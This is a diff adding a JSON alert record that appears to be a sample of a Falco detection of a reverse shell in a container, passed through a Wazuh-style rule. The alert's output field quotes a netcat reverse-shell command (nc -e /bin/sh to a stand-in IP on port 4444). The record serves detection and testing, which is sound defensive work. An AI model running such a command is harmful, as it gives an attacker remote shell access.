@@ -1,0 +1,22 @@
+{
+  "agent": {
+    "name": "target-endpoint",
+    "ip": "172.22.0.13"
+  },
+  "data": {
+    "falco": {
+      "rule": "Reverse shell in container",
+      "priority": "Critical",
+      "output": "container exec pid=14411 user=root container=app-be image=registry.local/app-be:1.4.7 exe=/bin/nc cmd='-e /bin/sh 198.51.100.66 4444'"
+    }
+  },
+  "rule": {
+    "id": "100013",
+    "level": 12,
+    "description": "Falco: Reverse shell to external IP"
+  },
+  "predecoder": {
+    "program_name": "falco",
+    "timestamp": "May 11 03:44:09"
+  }
+}
